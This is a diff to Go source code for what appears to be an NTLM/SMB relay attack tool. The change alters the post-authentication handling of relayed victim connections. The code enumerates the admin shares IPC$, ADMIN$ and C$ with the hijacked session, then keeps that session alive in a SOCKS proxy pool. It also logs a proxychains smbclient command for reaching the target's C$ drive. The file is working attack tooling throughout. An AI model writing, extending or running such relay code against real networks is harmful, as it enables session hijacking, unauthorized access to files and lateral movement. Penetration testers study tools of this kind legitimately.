@@ -22,7 +22,6 @@ import (
 	"fmt"
 	"io"
 	"net"
-	"strings"
 	"sync/atomic"
 	"time"
 
@@ -162,28 +161,21 @@ func HandleRelay(victimConn net.Conn, targetIP net.IP) bool {
 	return true
 }
 
-// postAuthActions runs after a successful relay and exercises the authenticated
-// session: it enumerates accessible shares and optionally executes a command.
+// postAuthActions enumerates accessible shares then, if SOCKS is enabled,
+// keeps the authenticated session alive in the Pool instead of closing it.
 func postAuthActions(id int64, target *smbConn, targetIP net.IP, sessionID uint64) {
-	defer target.close()
-
-	// Probe share access by attempting TreeConnect to common admin shares.
-	shares := []string{
+	candidates := []string{
 		fmt.Sprintf(`\\%s\IPC$`, targetIP),
 		fmt.Sprintf(`\\%s\ADMIN$`, targetIP),
 		fmt.Sprintf(`\\%s\C$`, targetIP),
 	}
 
 	var accessible []string
-	var ipcTreeID uint32
-	for _, share := range shares {
-		treeID, err := target.treeConnect(sessionID, share)
+	for _, share := range candidates {
+		_, err := target.treeConnect(sessionID, share)
 		if err == nil {
 			accessible = append(accessible, share)
-			if strings.HasSuffix(share, `IPC$`) {
-				ipcTreeID = treeID
-			}
-			core.LogSuccess("[Relay#%d] accessible: %s (treeID=0x%X)", id, share, treeID)
+			core.LogSuccess("[Relay#%d] accessible: %s", id, share)
 		} else {
 			core.LogInfo("[Relay#%d] denied:     %s (%v)", id, share, err)
 		}
@@ -191,14 +183,22 @@ func postAuthActions(id int64, target *smbConn, targetIP net.IP, sessionID uint6
 
 	if len(accessible) == 0 {
 		core.LogInfo("[Relay#%d] no shares accessible — session may be guest-only", id)
+		target.close()
 		return
 	}
 
-	_ = ipcTreeID // reserved for future named-pipe exec
+	// Keep the session alive for SOCKS proxy use when the listener is enabled.
+	if SocksPort > 0 {
+		sess := Pool.Register(targetIP, sessionID, target, accessible)
+		core.LogSuccess("[Relay#%d] session #%d registered in SOCKS pool", id, sess.ID)
+		core.LogSuccess("[Relay#%d] proxychains smbclient //%s/C$ -U 'x%%x' --no-pass", id, targetIP)
+		return // target.close() NOT called — pool owns the conn
+	}
+
+	target.close()
 
 	if ExecCmd != "" {
-		core.LogInfo("[Relay#%d] --relay-cmd exec via svcctl not yet implemented in this build", id)
-		core.LogInfo("[Relay#%d] hint: use the sessionID 0x%X with a standalone SMB client", id, sessionID)
+		core.LogInfo("[Relay#%d] --relay-cmd not yet implemented; sessionID=0x%X", id, sessionID)
 	}
 }
 
